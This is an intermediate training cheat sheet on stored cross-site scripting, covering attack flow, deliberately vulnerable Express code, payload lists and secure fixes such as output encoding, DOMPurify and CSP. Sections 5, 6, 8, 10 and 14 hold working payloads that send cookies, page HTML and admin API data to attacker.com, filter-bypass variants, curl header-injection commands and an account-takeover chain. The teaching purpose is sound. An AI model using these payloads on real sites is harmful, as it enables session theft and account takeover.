# Module 3 — Stored XSS: Cheat Sheet & Field Reference

> **Scope:** Ethical hacking · Bug bounty · Secure coding · Defensive understanding  
> **Level:** Intermediate  
> **Date:** 2026-05

---

## 1. Core Definition

Stored XSS (Persistent XSS) occurs when an application saves attacker-controlled input to a backend store — database, log file, cache, file system — and later retrieves and renders it in a page without proper output encoding.

**The fundamental difference from Reflected XSS:**

```
Reflected:  Input → Response → Execution          (one trip, needs a click)
Stored:     Input → Database → Response → Execution   (persistent, automatic)
```

**The two-phase model:**
- Phase 1 — Injection: attacker submits malicious input once. Happens silently.
- Phase 2 — Execution: fires automatically for every user who loads the affected page.

No crafted link. No social engineering. The attack vector is the application's own normal workflow.

---

## 2. Full Attack Flow

```
PHASE 1 — INJECTION (attacker, happens once)
─────────────────────────────────────────────────────────────────
Attacker submits payload
        ↓
Vulnerable app (no sanitization on save)
        ↓
Database — payload stored at rest

         [ time passes — seconds, days, weeks ]

PHASE 2 — EXECUTION (every victim who views the page)
─────────────────────────────────────────────────────────────────
Any victim visits affected page
        ↓
Server fetches content from DB
        ↓
DB returns stored payload
        ↓
Server builds HTML response with payload embedded (no encoding)
        ↓
Victim browser parses response — treats payload as code
        ↓
Attacker-controlled JavaScript executes in victim's browser
        ↓
Cookie theft / session abuse / data exfiltration / account takeover
```

---

## 3. Where Stored XSS Hides — Full Injection Surface

| Input vector | Rendered where | Why dangerous |
|---|---|---|
| Comment / forum post | Public post pages | Every reader is a victim |
| Display name / username | Every page showing your name | Headers, navbars, dashboards |
| Profile bio / About me | Profile pages | Viewed by other users |
| Product review | Product listing page | High traffic, many victims |
| Support ticket subject | Admin dashboard | Targets privileged accounts |
| File name on upload | File manager UI | Targets admins who browse uploads |
| `User-Agent` header | Server logs rendered in admin UI | Targets log viewers |
| `Referer` / `X-Forwarded-For` | Analytics dashboards | Header injection, not a form field |
| SVG file upload | Anywhere SVGs render inline | SVG executes JS natively |
| JSON API response field | SPA client-side rendering | Client-side sink, no server encoding |
| Rich text editor content | Blog posts, wiki pages | Allowlist bypass if poorly configured |

---

## 4. Vulnerable Code Patterns

### Node.js / Express — classic stored XSS
```javascript
// POST — saves without sanitization
app.post('/comment', async (req, res) => {
  const { name, text } = req.body;
  await db.query(
    'INSERT INTO comments (name, text) VALUES (?, ?)',
    [name, text]   // parameterized = SQL safe, but XSS ignored entirely
  );
  res.redirect('/');
});

// GET — renders without encoding
app.get('/', async (req, res) => {
  const comments = await db.query('SELECT name, text FROM comments');
  const html = comments.map(c =>
    `<div>
       <b>${c.name}</b>      <!-- VULNERABLE — HTML text context -->
       <p>${c.text}</p>      <!-- VULNERABLE — HTML text context -->
     </div>`
  ).join('');
  res.send(`<html><body>${html}</body></html>`);
});
```

**Key insight:** Parameterized queries protect against SQL injection but have zero effect on XSS. These are separate vulnerability classes requiring separate defenses.

### Admin dashboard — privilege escalation via stored XSS
```javascript
// Ticket subject rendered in admin panel without encoding
app.get('/admin/tickets', adminOnly, async (req, res) => {
  const tickets = await db.query('SELECT id, subject, username FROM tickets');
  const rows = tickets.map(t => `
    <tr>
      <td>${t.id}</td>              <!-- DB-generated, low risk -->
      <td>${t.subject}</td>         <!-- VULNERABLE — fully attacker controlled -->
      <td>${t.username}</td>        <!-- VULNERABLE — attacker controlled -->
      <td><a href="/admin/tickets/${t.id}">View</a></td>  <!-- URL context -->
    </tr>
  `).join('');
  res.send(`<html><body><table>${rows}</table></body></html>`);
});
```

---

## 5. Payloads — With Full Reasoning

### Basic proof of concept
```html
<script>alert(document.domain)</script>
```
Confirms JS executes in the target origin. Use `document.domain` not `1` — proves origin context for the report.

### Cookie exfiltration
```html
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ cookie: document.cookie, url: window.location.href })
  });
</script>
```

### When HttpOnly blocks document.cookie — steal page content instead
```javascript
// Exfiltrate the full page HTML (admin dashboard content, user lists, etc.)
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: document.documentElement.innerHTML
});

// Make authenticated API calls AS the victim
fetch('/api/admin/users')
  .then(r => r.json())
  .then(data => fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  }));

// Persistent account takeover — change email without needing cookie
fetch('/api/account/update', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ email: 'attacker@evil.com' })
});
```

**Critical:** HttpOnly cookies do not prevent account takeover. The authenticated session is the asset — not the cookie string itself.

### Event handler payloads — when script tags are filtered
```html
<!-- Fires on page load — no user interaction needed -->
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">

<!-- Autofocus — fires immediately without click -->
<input onfocus="fetch('https://attacker.com/?c='+document.cookie)" autofocus>

<!-- SVG onload -->
<svg onload="fetch('https://attacker.com/?c='+document.cookie)"></svg>

<!-- Body event -->
<body onpageshow="fetch('https://attacker.com/?c='+document.cookie)">
```

### javascript: URI — via allowed anchor tags
```html
<a href="javascript:fetch('https://attacker.com/?c='+document.cookie)">
  Click here for the prize
</a>
```
Bypasses blocklists that filter script tags and event handlers but allow `<a>` tags.

### Alternate exfiltration — when fetch is CSP-blocked
```javascript
// Image-based — works even with strict fetch CSP in older configs
new Image().src = 'https://attacker.com/steal?c=' + encodeURIComponent(document.cookie);
```

---

## 6. Blocklist Bypass Techniques

### Why blocklists always fail
A blocklist asks: "is this input evil?" — an unanswerable question.
An allowlist asks: "is this input approved?" — a tractable one.

### Common blocklist bypasses
```html
<!-- App blocks: <script>, onerror, onload, onclick, onresize -->

<!-- Bypass 1 — unlisted event handler (150+ exist) -->
<img src=x onmouseover="alert(1)">
<img src=x onmouseenter="alert(1)">
<input onfocus="alert(1)" autofocus>
<details ontoggle="alert(1)" open>
<select onfocus="alert(1)" autofocus>

<!-- Bypass 2 — javascript: URI via allowed tag -->
<a href="javascript:alert(1)">click</a>

<!-- Bypass 3 — case variation (if filter is case-sensitive) -->
<img src=x OnErRoR="alert(1)">
<SCRIPT>alert(1)</SCRIPT>

<!-- Bypass 4 — whitespace between attribute and = (confuses regex) -->
<img src=x onerror =alert(1)>
<img src=x onerror	=alert(1)>   <!-- tab character -->

<!-- Bypass 5 — SVG native script support -->
<svg><script>alert(1)</script></svg>
<svg onload="alert(1)"></svg>
<svg><animate onbegin="alert(1)" attributeName="x" dur="1s"/></svg>

<!-- Bypass 6 — data URI in iframe -->
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>

<!-- Bypass 7 — HTML entity encoding (confuses string-based filters) -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
```

### The scale of the problem
```
Blocked by developer:    4 event handlers
Total HTML event handlers: 150+
Coverage:                ~2.5%
```

No blocklist is maintainable. The attack surface grows with every new HTML spec.

---

## 7. Second-Order XSS

Injection and execution are separated in time and location. Automated scanners frequently miss this.

```
User action:   Uploads file named <img src=x onerror=alert(1)>.jpg
Stored in:     Database / filesystem as filename
Executed in:   Admin file manager when staff browse uploads
```

**Why scanners miss it:** A scanner tests the upload endpoint and checks the immediate response for reflection. It never navigates to the admin panel to check if the filename rendered there. Second-order XSS frequently survives automated security audits.

**Other second-order vectors:**
- User-Agent stored in logs → rendered in admin log viewer
- Username set at registration → rendered in admin user search results
- Support ticket subject → rendered in admin ticket queue
- Profile bio → rendered when support staff investigate a flagged account

---

## 8. Header Injection — The Hidden Attack Surface

```bash
# Inject payload via User-Agent
curl -A "<script>fetch('https://attacker.com/?c='+document.cookie)</script>" \
  https://target.com/any-page

# Other injectable headers
curl -H "X-Forwarded-For: <script>alert(1)</script>" https://target.com
curl -H "Referer: <img src=x onerror=alert(1)>" https://target.com
```

**Why this is unusual:**
- Requires Burp Suite, curl, or custom script — invisible to manual browser testing
- Victim is almost always an admin (log viewers are internal tools)
- Payload persists in logs — may sit there for months
- Execution happens in a privileged context automatically

---

## 9. Discovery Methodology — Two-Phase Approach

```
PHASE 1 — Find every input that gets saved
─────────────────────────────────────────────────────────────────
□ Map all form fields, text areas, file name inputs
□ Identify HTTP headers the app processes (User-Agent, Referer, X-Forwarded-For)
□ Check API endpoints that accept JSON body data
□ Inject unique probe per field:
    storedxss_name_001
    storedxss_bio_002
    storedxss_ticket_003

PHASE 2 — Find every place saved data gets rendered
─────────────────────────────────────────────────────────────────
□ Browse ALL pages that display user content
□ Check admin panels (log in with test admin account if authorized)
□ Search page source for your probe strings
□ Note every context each probe appears in
□ Ask: who else sees this data? Support staff? Admins? Other users?
□ Select context-appropriate payload
□ Verify execution with alert(document.domain)
□ Demonstrate real impact with cookie exfil or authenticated API call
```

---

## 10. Privilege Escalation via Stored XSS

The most severe stored XSS pattern. Low-privilege injection, high-privilege execution.

```
Attack chain:
1. Regular user submits support ticket
   Subject: <script>fetch('https://attacker.com',{method:'POST',body:document.documentElement.innerHTML})</script>

2. Attacker waits — no further action needed

3. Admin opens ticket queue as part of normal workflow
   → Script executes in admin's browser context
   → Admin session, admin API access, admin dashboard content all exposed

4. Attacker receives full admin dashboard HTML at their server
   → User lists, API keys, internal configs, other users' data

5. Attacker makes authenticated admin API calls via the script
   → Create admin account, exfiltrate all user data, modify configurations
```

**Arguing severity to a triager who wants to downgrade:**

Even if the injected field is "low visibility":
- Support staff open tickets as part of their job — no social engineering needed
- Moderators review flagged content — execution happens in their privileged session
- Admins search user accounts — profile previews render in search results
- You cannot guarantee "only the user sees this" — administrative workflows always touch user content

---

## 11. Secure Fixes

### Output encoding — HTML context (Node.js)
```javascript
const he = require('he');

const html = comments.map(c =>
  `<div class="comment">
     <b>${he.encode(c.name)}</b>
     <p>${he.encode(c.text)}</p>
   </div>`
).join('');
```

### Output encoding — URL attribute context
```javascript
// he.encode for HTML attribute, encodeURIComponent for URL path segment
`<a href="/admin/tickets/${encodeURIComponent(t.id)}">View</a>`

// Block javascript: URIs — validate scheme before rendering
const safeHref = href.match(/^https?:\/\//i) ? href : '#';
`<a href="${he.encode(safeHref)}">Link</a>`
```

### Rich text — allowlist-based DOM sanitizer (NOT blocklist)
```javascript
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const DOMPurify = createDOMPurify(new JSDOM('').window);

function sanitizeRichText(input) {
  return DOMPurify.sanitize(input, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'ol', 'li', 'br'],
    ALLOWED_ATTR: ['href'],
    ALLOW_DATA_ATTR: false,
    ALLOWED_URI_REGEXP: /^https?:\/\//i   // blocks javascript: URIs entirely
  });
}
```

**Why DOMPurify works where blocklists fail:**
DOMPurify parses HTML into a real DOM tree and rebuilds it using only allowed nodes. It does not scan strings. There is no regex to bypass — the parsed structure is clean by construction.

### Full hardened comment endpoint
```javascript
const he = require('he');
const rateLimit = require('express-rate-limit');
const csrf = require('csurf');

const commentLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  message: 'Too many comments — slow down'
});

app.post('/comment', commentLimiter, csrf(), (req, res) => {
  const { name, text } = req.body;

  // Type validation
  if (typeof name !== 'string' || typeof text !== 'string') {
    return res.status(400).send('Invalid input');
  }

  // Length limits
  if (name.length > 50 || text.length > 1000) {
    return res.status(400).send('Input too long');
  }

  // Reject empty
  if (!name.trim() || !text.trim()) {
    return res.status(400).send('Fields required');
  }

  // Store raw — never sanitize on input
  db.query('INSERT INTO comments (name, text) VALUES (?, ?)',
    [name.trim(), text.trim()]);

  res.redirect('/');
});

// Render with output encoding
app.get('/', (req, res) => {
  // Set CSP header — second layer of defense
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; script-src 'self'; object-src 'none'");

  const html = comments.map(c =>
    `<div>
       <b>${he.encode(c.name)}</b>
       <p>${he.encode(c.text)}</p>
     </div>`
  ).join('');

  res.send(`<html><body>${html}</body></html>`);
});
```

---

## 12. Why Input Sanitization Is Architecturally Flawed

The developer argument: "We strip HTML tags on input. The data in our database is clean."

**Why this is wrong — five angles:**

| Argument | Explanation |
|---|---|
| Lossy sanitization | `O'Brien` becomes `OBrien`. `x > y` is mangled. Data is permanently destroyed with no recovery. |
| Context blindness | At input time you don't know every future rendering context. Safe for HTML, dangerous in JS string. |
| Non-web data paths | Direct DB inserts, CSV imports, API integrations, legacy migrations all bypass your input layer entirely. |
| Legitimate content destroyed | Security controls that break functionality get disabled by developers. Defense must not interfere with use. |
| Output encoding is always correct | Applied at render time, in the exact rendering context, with full information. Never modifies stored data. |

**The correct mental model:**
```
INPUT LAYER   → Validate   (reject wrong type, length, format)
STORAGE LAYER → Store raw  (preserve original, unmodified)
OUTPUT LAYER  → Encode     (context-aware, at render time, always)
```

---

## 13. Full Defense Stack

```
Layer 1 → Input validation      Type checks, length limits, format rules
Layer 2 → Output encoding       he.encode() for HTML, JSON.stringify() for JS
Layer 3 → Allowlist sanitizer   DOMPurify for rich text — never a blocklist
Layer 4 → Rate limiting         Prevent storage exhaustion and flooding
Layer 5 → CSP header            Restrict script execution, block external requests
Layer 6 → CSRF protection       Prevent cross-site form submissions
Layer 7 → Authentication        Know who posts — enable accountability and revocation
```

XSS encoding is layer 2 of 7. Thinking only about XSS leaves six layers undefended.

---

## 14. Bug Bounty Impact Escalation

```
Basic PoC:        alert(document.domain)
                  → "Stored XSS exists in this field"

Cookie theft:     new Image().src = 'https://attacker.com/?c=' + document.cookie
                  → "Session data accessible — account takeover possible"

HttpOnly bypass:  Exfiltrate page HTML + authenticated API calls
                  → "HttpOnly does not prevent account takeover"

Admin target:     Support ticket → admin dashboard execution
                  → "Privilege escalation — full application compromise"

Worm potential:   Payload replicates itself to other users' profiles
                  → "Self-propagating — all users affected automatically"
```

---

## 15. Key Mental Models

> "The injection and the execution are separated in time, location, and victim. This is what makes stored XSS fundamentally different."

> "The attacker weaponizes the admin's own workflow. No social engineering needed — just wait."

> "HttpOnly cookies prevent cookie theft. They do not prevent account takeover. The authenticated session is the asset."

> "A blocklist covers 2.5% of the attack surface. An allowlist covers 100%."

> "Sanitize on input = permanent data destruction + context blindness. Encode on output = always correct."

> "Parameterized queries fix SQL injection. They do nothing for XSS. These are separate problems requiring separate solutions."

---

## 16. Coming Up — Module 4: DOM XSS

- The server sends a perfectly safe response
- The vulnerability lives entirely in client-side JavaScript
- No server involvement in the injection
- Sources: `location.hash`, `document.URL`, `postMessage`, `localStorage`
- Sinks: `innerHTML`, `document.write`, `eval`, `setTimeout`
- Invisible to server-side scanners and WAFs
- The hardest XSS type to find and the most misunderstood